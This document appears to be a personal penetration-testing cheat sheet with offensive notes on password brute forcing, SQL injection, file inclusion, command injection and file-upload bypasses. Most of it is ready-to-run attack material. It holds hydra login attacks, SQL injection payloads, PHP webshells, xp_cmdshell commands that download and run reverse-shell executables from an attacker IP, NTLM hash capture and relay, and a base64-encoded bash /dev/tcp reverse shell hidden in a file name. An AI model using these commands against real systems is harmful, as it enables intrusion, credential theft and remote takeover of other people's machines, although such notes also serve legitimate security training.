
### Password Attack
- username as the password
- default password of the service
- weak passwords (admin, root, password123, Password...)
	- try the name of the service or username as password as well
- search passwords in ftp, smb, snmp, ...
- add rules to brute force
- search for passwords managers like KeePass (database.kdbx)


```
# brute force
hydra -l <user> -P <password> -s <port> <protocol>://<ip>

# http login pages
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"

hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.164.103 http-post-form -s 8080 "/login:password=^PASS^:Incorrect password."  

# HTTP Basic Authentication
hydra -I -V -C creds.txt -t 1 "http-get://192.168.228.131:80/svn:A=BASIC:F=401"

# username and password encoded
hydra -I -f -L custom-wordlist.txt -P custom-wordlist.txt 'http-post-form://192.168.233.61:8081/service/rapture/session:username=^USER64^&password=^PASS64^:C=/:F=403'

patator http_fuzz url=https://172.16.10.248:8081/lib/crud/userprocess.php method=POST body='user=admin&pass=COMBO00&sublogin=1' 0=/usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt after_urls=https://172.16.10.248:8081/dashboard.php accept_cookie=1 follow=1 max_follow=2 -x ignore:clen=5878
```


tools:
- hashcat
- hashid
- john
- ssh2john
- patator

wordlists
```
/usr/share/wordlists/fasttrack.txt
/usr/share/wordlists/rockyou.txt
```

create generate wordlist using cewl
```
cewl http://<ip>:<port>/ | grep -v CeWL > custom-wordlist.txt
cewl --lowercase http://<ip>:<port>/ | grep -v CeWL  >> custom-wordlist.txt
```

generate user wordlist base user info
```
~/offsec/tools/userlistcreator.py

python3 ~/offsec/tools/cupp/cupp.py -i
```

another generate tool, username-anarchy https://github.com/urbanadventurer/username-anarchy
```
~/offsec/tools/username-anarchy --input-file ./user.txt > users.txt
```


### SQL

#### MYSQL

##### sqli

https://book.hacktricks.xyz/pentesting-web/sql-injection

Blind SQL Injections

```
' AND IF (1=1, sleep(5),'false') -- //
```

Identifying SQLi via Error-based Payloads

```
' OR 1=1 -- //
' or 1=1 in (select @@version) -- //
' OR 1=1 in (SELECT * FROM users) -- //
' or 1=1 in (SELECT password FROM users) -- //
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```

UNION-based Payloads

```
' ORDER BY 1-- //
%' UNION SELECT database(), user(), @@version, null, null -- //
' UNION SELECT null, null, database(), user(), @@version  -- //
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
' UNION SELECT null, username, password, description, null FROM users -- //
```

##### general commands

```
# connect to mysql DB
mysql -u root -p'root' -h 192.168.50.16 -P 3306

# check version
select version();

#check users
select system_user();

# list databases
show databases;

# list tables
show tables from <database>;

# chose database
use <database>;

# show table
select * from <table name>;
```

##### RCE

write webshell
```
SELECT "<?php echo shell_exec($_GET['cmd']); ?>" INTO OUTFILE 'c:/wamp/www/webshell.php'
```

##### local privilege escalation
https://steflan-security.com/linux-privilege-escalation-exploiting-user-defined-functions/?source=post_page-----6cc4d6eea356--------------------------------

#### MSSQL

##### sqli

https://book.hacktricks.xyz/pentesting-web/sql-injection

Blind SQL Injections

```
1' WAITFOR DELAY '0:0:5' --//
```

Identifying SQLi via Error-based Payloads

```
' OR 1=1 -- //
' or 1=1 in (select @@version) -- //
' OR 1=1 in (SELECT * FROM users) -- //
' or 1=1 in (SELECT password FROM users) -- //
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```

UNION-based Payloads

```
' ORDER BY 1-- //
%' UNION SELECT database(), user(), @@version, null, null -- //
' UNION SELECT null, null, database(), user(), @@version  -- //
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
' UNION SELECT null, username, password, description, null FROM users -- //
```

 yes/no questions

```
# time based attack - mssql
'; IF ((select count(name) from sys.tables where name = 'users')=1) WAITFOR DELAY '0:0:10';--
```
##### general commands

```
# connect to mssql DB
mssqlclient.py Administrator:Lab123@192.168.50.18 -windows-auth
mssqlclient.py domain/Administrator:Lab123@192.168.50.18 -windows-auth
mssqlclient.py PublicUser:GuestUserCantWrite1@sequel.htb


# check version
SELECT @@version;

# list databases
SELECT name FROM sys.databases;

# list tables
SELECT * FROM <db name>.information_schema.tables;

# check if we can impersonate to a user
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'

# impersonate
EXECUTE AS LOGIN = '<username>'
```

##### RCE

###### run commands
```
# login
mssqlclient.py Administrator:Lab123@192.168.50.18 -windows-auth
mssqlclient.py domain/Administrator:Lab123@192.168.50.18 -windows-auth
mssqlclient.py PublicUser:GuestUserCantWrite1@sequel.htb

# enable xp_cmdshell
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

#One liner
EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

# run commands
EXECUTE xp_cmdshell 'whoami';
```

###### write to target like webshell
```
# upload webshell
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //

' UNION SELECT "<?php system($_GET['cmd']);?>" into outfile '/srv/http/cmd.php' -- -

# write webshell
SELECT "<?php echo shell_exec($_GET['cmd']); ?>" INTO OUTFILE 'c:/wamp/www/webshell.php'

# run commands
http:/example.com/tmp/webshell.php?cmd=<command>
```

###### download tools to target and execute
```
# generate a payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell.exe

# python server
python3 -m http.server 8000

# start listener
nc -lvnp 4444

# Enable the shell command 
' ; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--

# Download our payload (pay attention to the /)
' ; EXEC xp_cmdshell 'certutil -urlcache -f http://<IP>:<PORT>/shell.exe C:\Windows\Temp\shell.exe';--

admin' UNION SELECT 1,2; EXEC xp_cmdshell 'powershell.exe "wget http://192.168.45.185:8000/revers_powershell.ps1"';--//

# Execute the payload
' ; EXEC xp_cmdshell 'C:\Windows\Temp\shell.exe';--
```

###### steal NTLM hash - force the SQL service to authenticate to our machine and capture the hash
```
# run responder
sudo responder -I tun0

# connect from mssql to smb server that i host using responder
EXEC MASTER.sys.xp_dirtree '\\<kali ip>\test', 1, 1

' OR 1=1 ; exec master.dbo.xp_dirtree '\\192.168.49.239\test';--

# crack the hash
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force -O
```

 ###### relay attack
```
# start smb server with the comment base64 encoded
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.247.159 -c "powershell -e JABjAGwAaQBlAG4Ad"

# login to smb server
mssqlclient.py Administrator:Lab123@192.168.50.18 -windows-auth

# connect ti smb share
SQL> EXEC MASTER.sys.xp_dirtree '\\192.168.45.243\test', 1, 1

# get shell if you run revers shell
nc -lvnp 80 
```

###### dump hashes
```
# start smb server 
sudo impacket-ntlmrelayx -t 192.168.247.159 -smb2support

# login to smb server
mssqlclient.py Administrator:Lab123@192.168.50.18 -windows-auth

# connect to smb share
SQL> xp_dirtree '\\192.168.45.243\share'

# in the impacket-ntlmrelayx we will see hashes
. . .
[*] All targets processed!
[*] SMBD-Thread-16 (process_request_thread): Connection from 192.168.247.158 controlled, but there are no more targets left!
[*] Target system bootKey: 0xf05dca6ed1673a51e5ae2479cb5da7c0
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a1fcb4118dfcbf52a53d6299aab57055:::
. . .
```

#### Postgres
##### sqli

https://book.hacktricks.xyz/pentesting-web/sql-injection

##### general commands

https://hasura.io/blog/top-psql-commands-and-flags-you-need-to-know-postgresql

##### RCE

https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5

https://medium.com/r3d-buck3t/command-execution-with-postgresql-copy-command-a79aef9c2767

### Directory Traversal

- use encoding
- try in curl or burp
- use exploit payload
- search ssh keys

```
/.ssh/id_rsa
/.ssh/id_ecdsa
/.ssh/identity.pub
/.ssh/identity
/.ssh/id_rsa.pub
/.ssh/id_dsa.pub
/.ssh/id_dsa
/etc/ssh/ssh_config
/etc/ssh/sshd_config
/etc/ssh/ssh_host_dsa_key.pub
/etc/ssh/ssh_host_dsa_key
/etc/ssh/ssh_host_rsa_key.pub
/etc/ssh/ssh_host_rsa_key
/etc/ssh/ssh_host_key.pub
/etc/ssh/ssh_host_key
```

### File Inclusion Vulnerabilities

upload file or add code to a file and then include it and execute
encode if needed

#### PHP Wrappers
 may hide part of the source code, reveal this code can help us find credentials or understand 
the logic of the code

```
for example: 

curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php

curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php

curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"

```

execute command

```
for example: 

curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"

echo -n '<?php echo system($_GET["cmd"]);?>' | base64
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
```

#### LFI
found a way to download the file to the root website directory and then render that from the url
the download can create from another service or another port
```
wfuzz -c --hh=32 -z file,/usr/share/wordlists/LFI_payload.txt http://192.168.207.246:8080/view?page=FUZZ 
```

#### RFI
for example, start python server and render the file from the url  
```
curl "http://mountaindesserts.com/meteor/index.php?page=http://ip/tevers_shell.php
```

### OS Command Injection

inject command to run thing on the server or connect that server to you 

- connect to SMB share - expose NTLM v2 hash
- connect to listener - revers shell
- download files from remote server
- run os command to reveal data
- throw DBs
- captcha in a packege
https://book.hacktricks.xyz/pentesting-web/command-injection

file names as command injection
```
echo -n 'bash -c "bash -i >& /dev/tcp/10.10.16.4/4444 0>&1"' | base64
YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40LzQ0NDQgMD4mMSI=

touch -- ';echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40LzQ0NDQgMD4mMSI= | base64 -d | bash'
```

use $IFS when url encoding

### .git

there are several tools here to take advantage when we found git file in the website
https://github.com/internetwache/GitTools/tree/master

```
bash /home/pinklii/offsec/tools/gitdumper.sh http://target.tld/.git/ <dest folder>

git-dumper http://bullybox.local/.git .
```

search:
- logs
- credentials in source code / config file
- search in google where credentials save in this repo
- check commits
- check other branches

### MitM

```
sudo responder -I tun0  

sudo impacket-smbserver -smb2support evilshare "$PWD"

\\192.168.45.193\evilshare

# crack the hash
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force -O
```

### file upload 

general ways: https://medium.com/@bensanel28/file-upload-attacks-htb-academy-fully-walkthrough-fca6153d294d
- change that content-type in burp suite
- overwrite .htaaccess file and defile extension that render php
- generate malicious file with the needed extension using tools  
- upload file throw ftp or smb share and render from the website
- use exploit
- read code and see what are the terms to pass 
- magic bytes

- markdown-pdf: https://hackerone.com/reports/360727
- pdfkit:  https://github.com/shamo0/PDFkit-CMD-Injection 

##### extensions
try different extensions
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst
```
php
php3
php4
php5
php7
pht
phtm
phtml
phar
phps
Php
pHP
pHp
```

##### duble extensions
upload file like this
```
webshell.php.txt
```
and in burp delete the txt.txt

##### headers
change the header in burp suite

##### .htaccess
https://thibaud-robin.fr/articles/bypass-filter-upload/
https://medium.com/@Dpsypher/proving-grounds-practice-access-b95d3146cfe9

##### client side attack
https://medium.com/@raphaeltzy13/introduction-to-client-side-attacks-oscp-62e9e254c0b7
if upload to smb share:
	https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/ 
	https://github.com/xct/hashgrab
	https://github.com/Greenwolf/ntlm_theft?source=post_page-----158516460860--------------------------------

### ssh key

found ssh key but cant connect via ssh

- over write files using scp that let you in or give you revers shell
- tunneling

### create venv

```
python3 -m venv path/to/venv
source path/to/venv/bin/activate

```